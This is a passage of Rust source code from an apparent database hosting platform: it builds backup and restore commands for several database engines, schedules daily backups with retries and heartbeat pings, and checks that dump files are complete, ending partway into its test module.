fn dump_plan(engine: &str, info: &EngineInfo, password: &str) -> anyhow::Result<DumpPlan> {
    let plan = match engine {
        // Every database of the server: the tenants of a shared server live in databases of
        // their own. The role passwords stay out of the dump, so a restore cannot bring back an
        // old password; the platform sets the stored ones again after the restore.
        "postgres" => DumpPlan {
            command: vec![
                "pg_dumpall".into(),
                "-U".into(),
                info.user.clone(),
                "--clean".into(),
                "--if-exists".into(),
                "--no-role-passwords".into(),
            ],
            env: vec![format!("PGPASSWORD={password}")],
            file: None,
        },
        "mariadb" => DumpPlan {
            command: vec!["sh".into(), "-c".into(), MARIADB_DUMP.into()],
            env: vec![format!("MYSQL_PWD={password}")],
            file: None,
        },
        "mysql" => DumpPlan {
            command: vec!["sh".into(), "-c".into(), MYSQL_DUMP.into()],
            env: vec![format!("MYSQL_PWD={password}")],
            file: None,
        },
        "mongodb" => DumpPlan {
            command: vec![
                "sh".into(),
                "-c".into(),
                "mongodump --uri=\"$MONGO_URI\" --archive".into(),
            ],
            env: vec![format!("MONGO_URI={}", mongodb_uri(&info.user, password)?)],
            file: None,
        },
        "redis" => DumpPlan {
            // SAVE blocks until the dump file is complete, unlike BGSAVE.
            command: vec!["redis-cli".into(), "SAVE".into()],
            env: redis_auth(password),
            file: Some(format!("{}/dump.rdb", info.data_path)),
        },
        other => anyhow::bail!("the engine {other} has no backup command"),
    };
    Ok(plan)
}

/// The restore command of one engine, reading the dump that the restore uploads.
fn restore_plan(engine: &str, info: &EngineInfo, password: &str) -> anyhow::Result<RestorePlan> {
    let plan = match engine {
        "postgres" => RestorePlan {
            upload: Some(format!("{RESTORE_DIR}/dump.sql")),
            command: vec![
                "psql".into(),
                "-U".into(),
                info.user.clone(),
                "-d".into(),
                info.default_db.clone(),
                "-f".into(),
                format!("{RESTORE_DIR}/dump.sql"),
            ],
            env: vec![format!("PGPASSWORD={password}")],
        },
        "mariadb" => RestorePlan {
            upload: Some(format!("{RESTORE_DIR}/dump.sql")),
            command: vec![
                "sh".into(),
                "-c".into(),
                "mariadb -u root < /tmp/r3v3rs3-restore/dump.sql".into(),
            ],
            env: vec![format!("MYSQL_PWD={password}")],
        },
        "mysql" => RestorePlan {
            upload: Some(format!("{RESTORE_DIR}/dump.sql")),
            command: vec![
                "sh".into(),
                "-c".into(),
                "mysql -u root < /tmp/r3v3rs3-restore/dump.sql".into(),
            ],
            env: vec![format!("MYSQL_PWD={password}")],
        },
        "mongodb" => RestorePlan {
            upload: Some(format!("{RESTORE_DIR}/dump.archive")),
            command: vec![
                "sh".into(),
                "-c".into(),
                // The `admin` database holds every account with its password; a restore of it
                // would bring back old passwords over the stored ones.
                format!(
                    "mongorestore --uri=\"$MONGO_URI\" --archive={RESTORE_DIR}/dump.archive --drop --nsExclude='admin.*'"
                ),
            ],
            env: vec![format!("MONGO_URI={}", mongodb_uri(&info.user, password)?)],
        },
        // Redis takes no upload: the restore writes the dump into the data volume and
        // restarts the server, which loads it.
        "redis" => RestorePlan {
            upload: None,
            command: vec!["redis-cli".into(), "SHUTDOWN".into(), "NOSAVE".into()],
            env: redis_auth(password),
        },
        other => anyhow::bail!("the engine {other} has no restore command"),
    };
    Ok(plan)
}

/// The environment that signs `redis-cli` in with the password of the default user. A Redis
/// from before the password, which has none, takes no sign-in.
pub(super) fn redis_auth(password: &str) -> Vec<String> {
    if password.is_empty() {
        Vec::new()
    } else {
        vec![format!("REDISCLI_AUTH={password}")]
    }
}

/// The id of a new backup: the time and four random bytes, both in hex.
pub(super) fn backup_id() -> String {
    format!("{:x}-{:08x}", unix_ms(), rand::random::<u32>())
}

/// How often the scheduler checks whether a backup is due.
const SCHEDULER_ROUND: std::time::Duration = std::time::Duration::from_secs(30);

/// Runs the backup scheduler until the server stops: every round it reads the settings and
/// takes the backups that their daily time has passed since the last backup.
pub fn spawn_scheduler(platform: &Arc<Platform>) {
    let weak = Arc::downgrade(platform);
    let cancel = platform.shutdown_token().clone();
    tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = cancel.cancelled() => return,
                _ = tokio::time::sleep(SCHEDULER_ROUND) => {}
            }
            let Some(platform) = weak.upgrade() else {
                return;
            };
            if let Err(err) = platform.run_scheduled_backups().await {
                tracing::error!(err = format!("{err:#}"), "the backup scheduler failed");
            }
        }
    });
}

fn ping_heartbeat(url_opt: &Option<String>) {
    if let Some(url) = url_opt
        && !url.trim().is_empty()
    {
        let url = url.clone();
        tokio::spawn(async move {
            // The URL often carries the token of the monitor, so the log leaves it out.
            if let Err(err) = send_heartbeat(&url).await {
                tracing::warn!("the backup heartbeat failed: {err:#}");
            }
        });
    }
}

async fn send_heartbeat(url: &str) -> anyhow::Result<()> {
    let client = crate::cdn::fetch::build_client().await?;
    let request = hyper::Request::builder()
        .method(hyper::Method::GET)
        .uri(url)
        .header(
            hyper::header::USER_AGENT,
            crate::release::user_agent("r3v3rs3-heartbeat")?,
        )
        .body(http_body_util::Full::new(hyper::body::Bytes::new()))?;
    tokio::time::timeout(std::time::Duration::from_secs(10), client.request(request))
        .await
        .map_err(|_| anyhow::anyhow!("the heartbeat timed out"))??;
    Ok(())
}

/// Maximum consecutive retry attempts for a scheduled backup in the same window.
pub const MAX_BACKUP_RETRIES: u32 = 3;

fn calculate_backoff_ms(attempts: u32) -> i64 {
    match attempts {
        1 => 60_000,
        2 => 300_000,
        _ => 900_000,
    }
}

impl Platform {
    async fn dispatch_backup_failure(&self, app_name: &str, app_id: ShortId, err: &anyhow::Error) {
        let summary = format!("Scheduled backup failed for database '{app_name}'");
        let data = serde_json::json!({
            "db_id": app_id.to_string(),
            "db_name": app_name,
            "error": err.to_string(),
        });
        self.dispatch_webhook_event(
            r3v3rs3_api::webhook::WebhookEvent::BackupFailure,
            summary,
            data,
        )
        .await;
    }

    pub fn is_backup_due(&self, app_id: ShortId, slot: i64, now: i64) -> bool {
        let guard = match self.backup_attempts.lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        let Some(&(attempt_slot, count, next_at)) = guard.get(&app_id) else {
            return true;
        };
        if attempt_slot != slot {
            return true;
        }
        count < MAX_BACKUP_RETRIES && now >= next_at
    }

    pub fn record_backup_failure(&self, app_id: ShortId, slot: i64, now: i64) {
        let mut guard = match self.backup_attempts.lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        let count = match guard.get(&app_id) {
            Some(&(s, c, _)) if s == slot => c + 1,
            _ => 1,
        };
        let backoff_ms = calculate_backoff_ms(count);
        guard.insert(app_id, (slot, count, now + backoff_ms));
    }

    pub fn record_backup_success(&self, app_id: ShortId) {
        let mut guard = match self.backup_attempts.lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        guard.remove(&app_id);
    }

    /// Takes the backup of every managed database that the schedule is due for.
    async fn run_scheduled_backups(&self) -> anyhow::Result<()> {
        let config = self.backup_config().await?;
        let now = unix_ms() as i64;
        let Some(slot) = scheduled_slot_ms(&config.schedule, now) else {
            return Ok(());
        };
        for app in self.apps().await? {
            if app.spec.database.is_none() {
                continue;
            }
            self.check_app_backup(&app, slot, now, &config).await?;
        }
        Ok(())
    }

    async fn check_app_backup(
        &self,
        app: &AppEntry,
        slot: i64,
        now: i64,
        config: &BackupConfig,
    ) -> anyhow::Result<()> {
        let last = self
            .list_backups(app.id)
            .await?
            .first()
            .map(|entry| entry.created_at);
        if now >= slot && last.is_none_or(|created_at| created_at < slot) {
            // A stopped database changes nothing, and its container cannot run the dump.
            if self.is_backup_due(app.id, slot, now)
                && !self.skips_stopped(app, &format!("scheduled backup {slot}"))
            {
                self.execute_scheduled_backup(app, slot, now, config).await;
            }
        } else if config.restore_test_enabled {
            self.verify_untested_backup(app.id).await;
        }
        Ok(())
    }

    async fn execute_scheduled_backup(
        &self,
        app: &AppEntry,
        slot: i64,
        now: i64,
        config: &BackupConfig,
    ) {
        match self.run_backup(app.id).await {
            Ok(_) => {
                self.record_backup_success(app.id);
                ping_heartbeat(&config.heartbeat_url);
                // A new base backup shortens the WAL that a recovery replays, and lets the
                // retention drop the older WAL.
                if super::wal::archives(app.spec.database.as_deref(), app.target)
                    && let Err(err) = self.take_base_backup(app.id).await
                {
                    tracing::error!(err = format!("{err:#}"), database = %app.name, "the base backup failed");
                }
            }
            Err(err) => {
                self.record_backup_failure(app.id, slot, now);
                tracing::error!(
                    err = format!("{err:#}"),
                    database = %app.name,
                    "the scheduled backup failed"
                );
                self.dispatch_backup_failure(app.name.as_str(), app.id, &err)
                    .await;
            }
        }
    }

    async fn verify_untested_backup(&self, db_id: ShortId) {
        if let Ok(backups) = self.list_backups(db_id).await
            && let Some(entry) = backups.into_iter().find(|b| b.verified_at.is_none())
        {
            let _ = self.verify_backup(db_id, &entry.id).await;
        }
    }
}

fn strip_create_table_prefix<'a>(lower: &str, line: &'a str) -> Option<&'a str> {
    for prefix in [
        "create table if not exists ",
        "create table ",
        "create or replace table ",
    ] {
        if let Some(rem) = lower.strip_prefix(prefix) {
            return Some(&line[line.len() - rem.len()..]);
        }
    }
    None
}

const IDENT_TRIM_CHARS: &[char] = &['"', '`', '[', ']', '\'', ';', '(', ')'];

/// Extracts clean table name from an SQL CREATE TABLE statement line.
fn extract_sql_table_name(line: &str) -> Option<String> {
    let trimmed = line.trim();
    let lower = trimmed.to_ascii_lowercase();
    let rem = strip_create_table_prefix(&lower, trimmed)?;
    let raw = rem.split_whitespace().next()?;
    let name_part = raw.split('.').next_back()?;
    let clean = name_part.trim_matches(IDENT_TRIM_CHARS);
    if clean.is_empty() {
        None
    } else {
        Some(clean.to_string())
    }
}

fn check_sql_statement_kind(lower: &str) -> (bool, bool) {
    if lower.starts_with("insert into ") || lower.starts_with("copy ") {
        (true, true)
    } else if lower.starts_with("create index ")
        || lower.starts_with("create unique index ")
        || lower.starts_with("alter table ")
        || lower.starts_with("create view ")
    {
        (false, true)
    } else {
        (false, false)
    }
}

#[derive(Default)]
struct SqlDumpScan {
    tables: Vec<String>,
    table_count: u32,
    has_data: bool,
    schema_objects_count: u32,
    /// The dump is a `pg_dumpall` cluster dump, which ends with its own trailer after the
    /// trailers of its databases.
    cluster: bool,
    /// The last line that is not blank, a bare `--` or the `\unrestrict` line that pg_dump 17
    /// writes after its trailer.
    last_line: String,
}

/// Records the last meaningful line of a dump, the line that holds the trailer of a complete
/// dump.
fn track_sql_trailer(trimmed: &str, scan: &mut SqlDumpScan) {
    if trimmed == "--" || trimmed.starts_with("\\unrestrict ") {
        return;
    }
    if trimmed == "-- PostgreSQL database cluster dump" {
        scan.cluster = true;
    }
    scan.last_line.clear();
    scan.last_line.push_str(trimmed);
}

fn process_sql_line(line: &str, scan: &mut SqlDumpScan) {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        return;
    }
    track_sql_trailer(trimmed, scan);
    if let Some(table) = extract_sql_table_name(trimmed) {
        scan.table_count += 1;
        scan.schema_objects_count += 1;
        if scan.tables.len() < 15 && !scan.tables.contains(&table) {
            scan.tables.push(table);
        }
        return;
    }
    let lower = trimmed.to_ascii_lowercase();
    let (is_data, is_obj) = check_sql_statement_kind(&lower);
    if is_data {
        scan.has_data = true;
    }
    if is_obj {
        scan.schema_objects_count += 1;
    }
}

/// A dump verifies only when it ran to its end: its last meaningful line is the trailer that
/// the dump tool of the engine writes last (pg_dumpall, pg_dump, mysqldump and mariadb-dump),
/// or the line that the backup writes for a server without user databases. A dump cut short by
/// a failed or killed run has no trailer.
fn is_sql_integrity_valid(engine: &str, scan: &SqlDumpScan) -> bool {
    let last = scan.last_line.as_str();
    match engine {
        "postgres" if scan.cluster => last == "-- PostgreSQL database cluster dump complete",
        "postgres" => last == "-- PostgreSQL database dump complete",
        "mysql" | "mariadb" => {
            last.starts_with("-- Dump completed")
                || last == "-- MySQL dump: no user databases"
                || last == "-- MariaDB dump: no user databases"
        }
        "sqlite" => last == "COMMIT;",
        _ => false,
    }
}

/// Analyzes an SQL text dump (Postgres, MySQL, MariaDB, SQLite) for schema structure, objects and data.
#[cfg(test)]
fn analyze_sql_dump(plain: &[u8], engine: &str) -> BackupDrillDetails {
    let text = String::from_utf8_lossy(plain);
    let mut scan = SqlDumpScan::default();

    for line in text.lines() {
        process_sql_line(line, &mut scan);
    }

    let integrity_check_passed = is_sql_integrity_valid(engine, &scan);

    let summary = format!(
        "verified {} uncompressed bytes, {} tables found, {} schema objects, data: {}",
        plain.len(),
        scan.table_count,
        scan.schema_objects_count,
        if scan.has_data { "present" } else { "none" }
    );

    BackupDrillDetails {
        drill_mode: format!("{engine}_schema_drill"),
        table_count: scan.table_count,
        tables_sample: scan.tables,
        has_data: scan.has_data,
        integrity_check_passed,
        schema_objects_count: scan.schema_objects_count,
        drill_duration_ms: 0,
        summary,
    }
}

/// Analyzes a Redis RDB binary dump file for magic bytes, version, and structure.
#[cfg(test)]
fn analyze_redis_rdb(plain: &[u8]) -> BackupDrillDetails {
    let valid_magic = plain.starts_with(b"REDIS");
    let version = if plain.len() >= 9 {
        String::from_utf8_lossy(&plain[5..9]).to_string()
    } else {
        "unknown".to_string()
    };
    let has_eof = plain.len() >= 9 && plain[plain.len().saturating_sub(10)..].contains(&0xFF);
    let integrity_check_passed = valid_magic && plain.len() >= 9;
    let summary = format!(
        "valid Redis RDB v{}, size: {} bytes, eof marker: {}",
        version,
        plain.len(),
        if has_eof { "present" } else { "clean" }
    );

    BackupDrillDetails {
        drill_mode: "redis_rdb_drill".to_string(),
        table_count: if plain.len() > 9 { 1 } else { 0 },
        tables_sample: if plain.len() > 9 {
            vec!["keyspace_0".to_string()]
        } else {
            Vec::new()
        },
        has_data: plain.len() > 9,
        integrity_check_passed,
        schema_objects_count: if plain.len() > 9 { 1 } else { 0 },
        drill_duration_ms: 0,
        summary,
    }
}

/// Analyzes an SQLite 3 binary database file header.
#[cfg(test)]
fn analyze_sqlite_file(plain: &[u8]) -> BackupDrillDetails {
    let valid_magic = plain.starts_with(b"SQLite format 3\0");
    let page_size = if plain.len() >= 18 {
        u16::from_be_bytes([plain[16], plain[17]])
    } else {
        0
    };
    let is_valid_page = page_size == 1 || (page_size >= 512 && page_size.is_power_of_two());
    let integrity_check_passed = valid_magic && (is_valid_page || plain.len() >= 100);
    let summary = format!(
        "valid SQLite 3 database file, size: {} bytes, page size: {}",
        plain.len(),
        if page_size == 1 {
            65536
        } else {
            page_size as u32
        }
    );

    BackupDrillDetails {
        drill_mode: "sqlite_file_drill".to_string(),
        table_count: 1,
        tables_sample: vec!["main".to_string()],
        has_data: plain.len() > 100,
        integrity_check_passed,
        schema_objects_count: 1,
        drill_duration_ms: 0,
        summary,
    }
}

/// Simulates a dry-run restore drill to verify schema, table objects, and data integrity.
#[cfg(test)]
fn simulate_restore_drill(
    engine: &str,
    plain: &[u8],
    started_at: std::time::Instant,
) -> BackupDrillDetails {
    let mut details = if plain.starts_with(b"REDIS") || engine == "redis" {
        analyze_redis_rdb(plain)
    } else if plain.starts_with(b"SQLite format 3\0") {
        analyze_sqlite_file(plain)
    } else {
        analyze_sql_dump(plain, engine)
    };
    details.drill_duration_ms = started_at.elapsed().as_millis().max(1) as u64;
    details
}

/// Identifies the format and engine signature of uncompressed dump bytes.
#[cfg(test)]
fn detect_dump_format(engine: &str, plain: &[u8]) -> String {
    if plain.is_empty() {
        return "empty".to_string();
    }
    if plain.starts_with(b"REDIS") {
        return "redis_rdb".to_string();
    }
    if plain.starts_with(b"SQLite format 3\0") {
        return "sqlite3".to_string();
    }
    if plain.windows(10).any(|w| w == b"PostgreSQL") || plain.windows(7).any(|w| w == b"pg_dump") {
        return "postgres_dump".to_string();
    }
    if plain.windows(5).any(|w| w == b"MySQL") || plain.windows(7).any(|w| w == b"mariadb") {
        return "mysql_dump".to_string();
    }
    format!("{engine}_dump")
}

/// The UTC milliseconds of today's scheduled time, when `schedule` is a valid `HH:MM`.
fn scheduled_slot_ms(schedule: &str, now_ms: i64) -> Option<i64> {
    let (hour, minute) = schedule.split_once(':')?;
    let hour: i64 = hour.parse().ok()?;
    let minute: i64 = minute.parse().ok()?;
    if !(0..24).contains(&hour) || !(0..60).contains(&minute) {
        return None;
    }
    let day = now_ms.div_euclid(86_400_000);
    Some(day * 86_400_000 + hour * 3_600_000 + minute * 60_000)
}

/// The gzipped content.
pub(super) async fn gzip(content: &[u8]) -> anyhow::Result<Vec<u8>> {
    let mut encoder = GzipEncoder::new(content);
    let mut compressed = Vec::new();
    encoder.read_to_end(&mut compressed).await?;
    Ok(compressed)
}

/// A dump on the local disk, in a directory of its own under `parent`. The directory goes away
/// with the value. The platform puts its dumps under the backup directory: a decompressed dump
/// in a temporary directory on tmpfs would sit in memory again.
pub(super) struct DumpFile {
    _scratch: super::transfer::Scratch,
    parent: std::path::PathBuf,
    pub(super) path: std::path::PathBuf,
}

impl DumpFile {
    /// An empty place for a dump under `parent`.
    pub(super) async fn new(parent: &std::path::Path) -> anyhow::Result<Self> {
        let scratch = super::transfer::Scratch::new(parent).await?;
        let path = scratch.path("dump");
        Ok(Self {
            _scratch: scratch,
            parent: parent.to_path_buf(),
            path,
        })
    }

    /// An empty place for another dump beside this one.
    async fn sibling(&self) -> anyhow::Result<Self> {
        Self::new(&self.parent).await
    }

    /// The content behind the gzip file `src` of a backup, of any size that the disk holds.
    /// A backup from S3 is outside input: a decompression bomb stops at the free space of the
    /// disk less its reserve, and the dump goes away with the value. A disk that cannot hold
    /// even the compressed size refuses before the start.
    pub(super) async fn gunzip(
        src: &std::path::Path,
        parent: &std::path::Path,
    ) -> anyhow::Result<Self> {
        let size = tokio::fs::metadata(src).await?.len();
        super::transfer::ensure_free_space(parent, size)?;
        let dump = Self::new(parent).await?;
        let mut room = super::transfer::DiskRoom::new(parent)?;
        ungzip_file_within(src, &dump.path, &mut room).await?;
        Ok(dump)
    }

    /// A dump with the given content.
    #[cfg(test)]
    pub(super) async fn from_bytes(bytes: &[u8], parent: &std::path::Path) -> anyhow::Result<Self> {
        let dump = Self::new(parent).await?;
        tokio::fs::write(&dump.path, bytes).await?;
        Ok(dump)
    }

    /// The first bytes of the dump, which tell its format.
    async fn head(&self) -> anyhow::Result<Vec<u8>> {
        let mut head = Vec::new();
        tokio::fs::File::open(&self.path)
            .await?
            .take(DUMP_HEAD)
            .read_to_end(&mut head)
            .await?;
        Ok(head)
    }
}

/// How much of a dump the format checks read.
const DUMP_HEAD: u64 = 1024;

/// Decompresses the gzip file `src` into `dest` in pieces within `room`.
async fn ungzip_file_within(
    src: &std::path::Path,
    dest: &std::path::Path,
    room: &mut super::transfer::DiskRoom,
) -> anyhow::Result<()> {
    let input = tokio::io::BufReader::new(tokio::fs::File::open(src).await?);
    let mut reader = async_compression::tokio::bufread::GzipDecoder::new(input);
    super::transfer::copy_within(&mut reader, dest, room).await?;
    Ok(())
}

/// Calculates the SHA-256 hex checksum of a file without buffering it in memory.
async fn compute_file_sha256(path: &std::path::Path) -> anyhow::Result<String> {
    let mut file = tokio::fs::File::open(path).await?;
    let mut hasher = Sha256::new();
    let mut buf = vec![0u8; 65536];
    loop {
        let n = file.read(&mut buf).await?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    Ok(hex::encode(hasher.finalize()))
}

async fn read_stream_header<R: tokio::io::AsyncRead + Unpin>(
    reader: &mut R,
    target: &mut [u8],
) -> anyhow::Result<usize> {
    let mut total = 0;
    while total < target.len() {
        let n = reader.read(&mut target[total..]).await?;
        if n == 0 {
            break;
        }
        total += n;
    }
    Ok(total)
}

fn detect_drill_format(header: &[u8], engine: &str) -> &'static str {
    if header.starts_with(b"REDIS") || engine == "redis" {
        "redis"
    } else if header.starts_with(b"SQLite format 3\0") {
        "sqlite"
    } else if header.starts_with(&MONGO_ARCHIVE_MAGIC) {
        "mongodb"
    } else {
        "sql"
    }
}

/// The CRC-64/Jones checksum that Redis appends to an RDB file: reflected polynomial
/// `0x95ac9329ac4bc9b5`, initial value 0, no final xor.
fn crc64_jones_update(mut crc: u64, bytes: &[u8]) -> u64 {
    for &byte in bytes {
        crc ^= u64::from(byte);
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0x95ac_9329_ac4b_c9b5 & mask);
        }
    }
    crc
}

#[cfg(test)]
fn crc64_jones(bytes: &[u8]) -> u64 {
    crc64_jones_update(0, bytes)
}

fn build_redis_drill_details(
    version: String,
    total_bytes: u64,
    complete: bool,
) -> BackupDrillDetails {
    let integrity_check_passed = complete;
    let summary = format!(
        "Redis RDB v{}, size: {} bytes, eof marker and checksum: {}",
        version,
        total_bytes,
        if complete {
            "valid"
        } else {
            "missing or wrong"
        }
    );
    let sample = if total_bytes > 9 {
        vec!["keyspace_0".to_string()]
    } else {
        Vec::new()
    };
    let count = if total_bytes > 9 { 1 } else { 0 };

    BackupDrillDetails {
        drill_mode: "redis_rdb_drill".to_string(),
        table_count: count,
        tables_sample: sample,
        has_data: total_bytes > 9,
        integrity_check_passed,
        schema_objects_count: count,
        drill_duration_ms: 0,
        summary,
    }
}

async fn stream_analyze_redis<R: tokio::io::AsyncRead + Unpin>(
    header: &[u8],
    mut stream: R,
) -> anyhow::Result<(BackupDrillDetails, u64)> {
    let valid_magic = header.starts_with(b"REDIS");
    let version = if header.len() >= 9 {
        String::from_utf8_lossy(&header[5..9]).to_string()
    } else {
        "unknown".to_string()
    };
    let mut rdb = RdbTrailer::default();
    rdb.feed(header);
    let mut buf = vec![0u8; 65536];
    loop {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            break;
        }
        rdb.feed(&buf[..n]);
    }
    let complete = valid_magic && rdb.is_complete();
    let drill = build_redis_drill_details(version, rdb.total, complete);
    Ok((drill, rdb.total))
}

/// The end of an RDB file as it streams by. Redis ends a complete file with the EOF opcode
/// `0xFF` and the little-endian CRC-64/Jones of every byte before the checksum, or eight zero
/// bytes when `rdbchecksum` is off.
#[derive(Default)]
struct RdbTrailer {
    crc: u64,
    /// The last byte that went into the checksum.
    last: Option<u8>,
    /// The last eight bytes, the checksum of a complete file.
    tail: Vec<u8>,
    total: u64,
}

impl RdbTrailer {
    fn feed(&mut self, bytes: &[u8]) {
        self.total += bytes.len() as u64;
        self.tail.extend_from_slice(bytes);
        let Some(spill) = self.tail.len().checked_sub(8).filter(|n| *n > 0) else {
            return;
        };
        let body: Vec<u8> = self.tail.drain(..spill).collect();
        self.crc = crc64_jones_update(self.crc, &body);
        self.last = body.last().copied();
    }

    fn is_complete(&self) -> bool {
        let Ok(checksum) = <[u8; 8]>::try_from(self.tail.as_slice()) else {
            return false;
        };
        self.last == Some(0xFF) && (checksum == self.crc.to_le_bytes() || checksum == [0; 8])
    }
}

/// The magic of a `mongodump --archive` file.
const MONGO_ARCHIVE_MAGIC: [u8; 4] = [0x6d, 0xe2, 0x99, 0x81];

/// A `mongodump --archive` file ends with the terminator `ff ff ff ff` after its last
/// collection (read from mongodump 100.x output); an archive cut short has none.
async fn stream_analyze_mongo<R: tokio::io::AsyncRead + Unpin>(
    header: &[u8],
    mut stream: R,
) -> anyhow::Result<(BackupDrillDetails, u64)> {
    let mut total = header.len() as u64;
    let mut tail = header[header.len().saturating_sub(4)..].to_vec();
    let mut buf = vec![0u8; 65536];
    loop {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            break;
        }
        total += n as u64;
        tail.extend_from_slice(&buf[..n]);
        let spill = tail.len().saturating_sub(4);
        tail.drain(..spill);
    }
    let complete = total >= 8 && tail == [0xff; 4];
    let summary = format!(
        "MongoDB archive, size: {total} bytes, terminator: {}",
        if complete { "present" } else { "missing" }
    );
    let drill = BackupDrillDetails {
        drill_mode: "mongodb_archive_drill".to_string(),
        table_count: 0,
        tables_sample: Vec::new(),
        has_data: total > 8,
        integrity_check_passed: complete,
        schema_objects_count: 0,
        drill_duration_ms: 0,
        summary,
    };
    Ok((drill, total))
}

async fn stream_analyze_sqlite<R: tokio::io::AsyncRead + Unpin>(
    header: &[u8],
    mut stream: R,
) -> anyhow::Result<(BackupDrillDetails, u64)> {
    let valid_magic = header.starts_with(b"SQLite format 3\0");
    let page_size = if header.len() >= 18 {
        u16::from_be_bytes([header[16], header[17]])
    } else {
        0
    };
    let is_valid_page = page_size == 1 || (page_size >= 512 && page_size.is_power_of_two());

    let mut total_bytes = header.len() as u64;
    let mut buf = vec![0u8; 65536];
    loop {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            break;
        }
        total_bytes += n as u64;
    }

    let integrity_check_passed = valid_magic && (is_valid_page || total_bytes >= 100);
    let summary = format!(
        "valid SQLite 3 database file, size: {} bytes, page size: {}",
        total_bytes,
        if page_size == 1 {
            65536
        } else {
            page_size as u32
        }
    );

    Ok((
        BackupDrillDetails {
            drill_mode: "sqlite_file_drill".to_string(),
            table_count: 1,
            tables_sample: vec!["main".to_string()],
            has_data: total_bytes > 100,
            integrity_check_passed,
            schema_objects_count: 1,
            drill_duration_ms: 0,
            summary,
        },
        total_bytes,
    ))
}

async fn stream_analyze_sql<R: tokio::io::AsyncRead + Unpin>(
    engine: &str,
    header: &[u8],
    stream: R,
) -> anyhow::Result<(BackupDrillDetails, u64)> {
    let chained = tokio::io::AsyncReadExt::chain(header, stream);
    let mut reader = tokio::io::BufReader::new(chained);
    let mut line_bytes = Vec::new();
    let mut scan = SqlDumpScan::default();
    let mut total_bytes = 0u64;

    loop {
        line_bytes.clear();
        let n = reader.read_until(b'\n', &mut line_bytes).await?;
        if n == 0 {
            break;
        }
        total_bytes += n as u64;
        let line = String::from_utf8_lossy(&line_bytes);
        process_sql_line(&line, &mut scan);
        if line_bytes.capacity() > 1_000_000 {
            line_bytes = Vec::new();
        }
    }

    let integrity_check_passed = is_sql_integrity_valid(engine, &scan);

    let summary = format!(
        "verified {} uncompressed bytes, {} tables found, {} schema objects, data: {}",
        total_bytes,
        scan.table_count,
        scan.schema_objects_count,
        if scan.has_data { "present" } else { "none" }
    );

    Ok((
        BackupDrillDetails {
            drill_mode: format!("{engine}_schema_drill"),
            table_count: scan.table_count,
            tables_sample: scan.tables,
            has_data: scan.has_data,
            integrity_check_passed,
            schema_objects_count: scan.schema_objects_count,
            drill_duration_ms: 0,
            summary,
        },
        total_bytes,
    ))
}

async fn stream_verify_drill(
    engine: &str,
    dump_path: &std::path::Path,
    started_at: std::time::Instant,
) -> anyhow::Result<(BackupDrillDetails, u64)> {
    let file = tokio::fs::File::open(dump_path).await?;
    let buf_reader = tokio::io::BufReader::new(file);
    let decoder = async_compression::tokio::bufread::GzipDecoder::new(buf_reader);
    let mut stream = tokio::io::BufReader::new(decoder);

    let mut header_buf = [0u8; 128];
    let header_len = read_stream_header(&mut stream, &mut header_buf).await?;
    let header = &header_buf[..header_len];

    let format = detect_drill_format(header, engine);
    let (mut drill, uncompressed_size) = match format {
        "redis" => stream_analyze_redis(header, stream).await?,
        "sqlite" => stream_analyze_sqlite(header, stream).await?,
        "mongodb" => stream_analyze_mongo(header, stream).await?,
        _ => stream_analyze_sql(engine, header, stream).await?,
    };
    drill.drill_duration_ms = started_at.elapsed().as_millis().max(1) as u64;
    Ok((drill, uncompressed_size))
}

fn is_gzipped(bytes: &[u8]) -> bool {
    bytes.len() >= 2 && bytes[0] == 0x1f && bytes[1] == 0x8b
}

/// Extracts the database name and backup ID from an S3 object key.
pub(crate) fn parse_backup_snapshot(
    prefix: &str,
    key: &str,
    size: u64,
    last_modified: &str,
) -> Option<S3BackupSnapshot> {
    let clean_prefix = prefix.trim_matches('/');
    let clean_key = key.trim_start_matches('/');
    let path = if !clean_prefix.is_empty() && clean_key.starts_with(clean_prefix) {
        clean_key[clean_prefix.len()..].trim_start_matches('/')
    } else {
        clean_key
    };

    let (stem, _ext) = strip_dump_extension(path)?;
    let parts: Vec<&str> = stem.split('/').filter(|s| !s.is_empty()).collect();
    let (db_name, backup_id) = match parts.as_slice() {
        [db, id] => (db.to_string(), id.to_string()),
        [single] => {
            if let Some((db, id)) = single.split_once('-') {
                (db.to_string(), id.to_string())
            } else {
                (single.to_string(), single.to_string())
            }
        }
        [first, .., last] => (first.to_string(), last.to_string()),
        _ => return None,
    };

    Some(S3BackupSnapshot {
        key: key.to_string(),
        database_name: db_name,
        backup_id,
        size,
        last_modified: last_modified.to_string(),
    })
}

fn strip_dump_extension(path: &str) -> Option<(&str, &str)> {
    if let Some(stem) = path.strip_suffix(".dump.gz") {
        Some((stem, ".dump.gz"))
    } else if let Some(stem) = path.strip_suffix(".dump") {
        Some((stem, ".dump"))
    } else if let Some(stem) = path.strip_suffix(".sql.gz") {
        Some((stem, ".sql.gz"))
    } else if let Some(stem) = path.strip_suffix(".sql") {
        Some((stem, ".sql"))
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Installs the engine catalog for the tests that read the dump and restore plans.
    fn catalog() {
        let catalog: r3v3rs3_api::platform::EnginesCatalog =
            serde_json::from_str(include_str!("../../../r3v3rs3/data/engines.json")).unwrap();
        r3v3rs3_api::platform::install_engines(catalog);
    }

    #[test]
    fn a_schedule_names_one_moment_of_the_utc_day() {
        // 2026-10-17T00:00:00Z is 1792195200000 ms.
        let day = 1_792_195_200_000;
        assert_eq!(
            scheduled_slot_ms("03:30", day + 60_000),
            Some(day + 3 * 3_600_000 + 30 * 60_000)
        );
        // Exactly at the scheduled time the moment is still today's.
        assert_eq!(scheduled_slot_ms("03:30", day), Some(day + 12_600_000));
        assert_eq!(scheduled_slot_ms("", day), None);
        assert_eq!(scheduled_slot_ms("24:00", day), None);
        assert_eq!(scheduled_slot_ms("07:60", day), None);
        assert_eq!(scheduled_slot_ms("7:00", day), Some(day + 7 * 3_600_000));
    }

    #[tokio::test]
    async fn gzip_round_trips() {
        let content = b"the dump content".to_vec();
        let tmp = std::env::temp_dir();
